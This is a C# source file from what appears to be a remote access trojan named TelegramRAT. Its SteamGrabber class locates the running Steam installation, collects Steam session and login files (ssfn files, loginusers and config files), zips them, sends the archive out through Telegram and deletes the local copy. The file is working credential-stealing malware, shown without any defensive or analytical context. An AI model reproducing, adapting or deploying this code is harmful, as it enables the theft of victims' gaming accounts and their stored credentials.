using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;

namespace TelegramRAT;

internal class SteamGrabber
{
	public static void get()
	{
		Process[] processesByName = Process.GetProcessesByName("Steam");
		if (processesByName.Length != 0)
		{
			string text = Path.GetDirectoryName(processesByName[0].MainModule!.FileName) + "\\";
			string text2 = Path.GetDirectoryName(config.InstallPath) + "\\steam.zip";
			Console.WriteLine(text);
			string[] files = Directory.GetFiles(text, "ssfn*");
			string[] files2 = Directory.GetFiles(text, "config\\loginusers.*");
			string[] files3 = Directory.GetFiles(text, "config\\config.*");
			IEnumerable<string> enumerable = files.Concat(files2).Concat(files3);
			using (ZipArchive destination = ZipFile.Open(text2, ZipArchiveMode.Create))
			{
				foreach (string item in enumerable)
				{
					destination.CreateEntryFromFile(item, item);
				}
			}
			telegram.sendFile(text2);
			File.Delete(text2);
		}
		else
		{
			telegram.sendText("\ud83d\udee0 Steam process not running..");
		}
	}
}
